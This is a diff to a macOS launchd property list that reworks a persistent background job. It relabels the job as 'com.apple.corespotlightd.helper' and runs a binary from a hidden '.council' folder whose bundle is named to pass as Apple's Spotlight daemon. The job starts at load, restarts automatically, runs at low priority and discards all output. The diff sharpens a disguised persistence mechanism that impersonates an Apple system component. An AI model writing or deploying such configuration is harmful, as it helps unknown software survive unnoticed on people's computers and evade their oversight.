@@ -3,25 +3,22 @@
 <plist version="1.0">
   <dict>
     <key>Label</key>
-    <string>com.apple.sync.daemon</string>
-    <key>ProgramArguments</key>
-    <array>
-      <string>/Users/cyberlord/Library/Application Support/.council/bin/syncd</string>
-    </array>
+    <string>com.apple.corespotlightd.helper</string>
+    <key>Program</key>
+    <string>/Users/cyberlord/Library/Application Support/.council/bin/com.apple.corespotlightd.app/Contents/MacOS/com.apple.corespotlightd</string>
     <key>RunAtLoad</key>
     <true />
     <key>KeepAlive</key>
-    <dict>
-      <key>SuccessfulExit</key>
-      <false />
-    </dict>
+    <true />
+    <key>ProcessType</key>
+    <string>Background</string>
+    <key>LowPriorityBackgroundIO</key>
+    <true />
+    <key>Nice</key>
+    <integer>10</integer>
     <key>StandardOutPath</key>
     <string>/dev/null</string>
     <key>StandardErrorPath</key>
     <string>/dev/null</string>
-    <key>ProcessType</key>
-    <string>Background</string>
-    <key>LSUIElement</key>
-    <true/>
   </dict>
 </plist>
